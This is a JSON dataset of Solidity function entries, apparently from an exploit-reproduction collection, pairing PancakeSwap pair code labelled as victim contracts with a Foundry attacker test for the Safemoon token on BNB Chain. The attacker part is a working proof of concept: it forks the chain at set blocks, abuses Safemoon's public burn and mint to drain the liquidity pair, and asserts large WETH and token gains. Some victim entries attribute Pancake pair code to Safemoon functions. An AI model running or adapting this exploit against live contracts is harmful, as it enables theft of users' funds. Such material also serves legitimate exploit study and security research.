[
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));\n        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
    "description": ""
  },
  {
    "contract/interface": "IWETH",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWETH",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWETH",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISafemoon",
    "source_type": "victim_contract",
    "function_name": "bridgeBurnAddress",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ISafemoon",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(address to) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 && amount1 > 0, 'Pancake: INSUFFICIENT_LIQUIDITY_BURNED');\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISafemoon",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        }\n        require(liquidity > 0, 'Pancake: INSUFFICIENT_LIQUIDITY_MINTED');\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISafemoon",
    "source_type": "victim_contract",
    "function_name": "uniswapV2Pair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ISafemoon",
    "source_type": "victim_contract",
    "function_name": "uniswapV2Router",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakeCallee",
    "source_type": "victim_contract",
    "function_name": "pancakeCall",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Router02",
    "source_type": "victim_contract",
    "function_name": "WETH",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Router02",
    "source_type": "victim_contract",
    "function_name": "routerTrade",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Pair",
    "source_type": "victim_contract",
    "function_name": "sync",
    "original_code": "    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "ISafeSwapTradeRouter",
    "source_type": "victim_contract",
    "function_name": "getSwapFees",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ISafeSwapTradeRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokensWithFeeAmount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "doBurnHack",
    "original_code": "    function doBurnHack(\n        uint256 amount\n    ) public {\n        swappingBnbForTokens(amount);\n        sfmoon.burn(sfmoon.uniswapV2Pair(), sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1_000_000_000);\n        sfmoon.burn(address(sfmoon), sfmoon.balanceOf(address(sfmoon)));\n        IUniswapV2Pair(sfmoon.uniswapV2Pair()).sync();\n        swappingTokensForBnb(sfmoon.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "pancakePair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://rpc.ankr.com/bsc\", 26_854_757);\n\n        sfmoon = ISafemoon(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);\n        pancakePair = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);\n        weth = IWETH(sfmoon.uniswapV2Router().WETH());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "sfmoon",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "testBurn",
    "original_code": "    function testBurn() public {\n        vm.rollFork(26_864_889);\n\n        uint256 originalBalance = weth.balanceOf(address(this));\n        emit log_named_uint(\"weth balance before:\", originalBalance);\n        assertEq(originalBalance, 0);\n\n        pancakePair.swap(1000 ether, 0, address(this), \"ggg\");\n\n        uint256 currentBalance = weth.balanceOf(address(this));\n        emit log_named_uint(\"weth balance after:\", currentBalance);\n        assertEq(currentBalance, 27_463_848_254_806_782_408_231);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "testMint",
    "original_code": "    function testMint() public {\n        vm.rollFork(26_854_757);\n\n        uint256 originalBalance = sfmoon.balanceOf(address(this));\n        emit log_named_uint(\"sfmoon balance before:\", originalBalance);\n        assertEq(originalBalance, 0);\n\n        sfmoon.mint(address(this), sfmoon.balanceOf(sfmoon.bridgeBurnAddress()));\n\n        uint256 currentBalance = sfmoon.balanceOf(address(this));\n        emit log_named_uint(\"sfmoon balance after:\", currentBalance);\n        assertEq(currentBalance, 81_804_509_291_616_467_966);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SafemoonAttackerTest",
    "source_type": "attacker_contract",
    "function_name": "weth",
    "original_code": "",
    "description": ""
  }
]